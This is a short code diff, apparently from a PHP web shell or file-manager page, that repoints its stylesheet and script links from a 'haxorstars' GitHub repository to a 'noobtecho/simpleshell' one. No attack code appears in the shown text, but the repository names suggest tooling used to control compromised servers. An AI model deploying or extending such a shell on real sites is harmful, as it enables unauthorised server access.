@@ -413,7 +413,7 @@ $lokasi = str_replace("\\", "/", $lokasi);
             document.getElementById('viewport').setAttribute('content', 'width=1024');
         }
     </script>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/haxorstars/archive@master/simple/css/main.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/noobtecho/simpleshell@master/main.css">
 </head>
 
 <body>
@@ -989,7 +989,7 @@ $lokasi = str_replace("\\", "/", $lokasi);
         </div>
     </footer>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/haxorstars/archive@master/simple/js/main.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/noobtecho/simpleshell@master/main.js"></script>
 </body>
 
 </html>
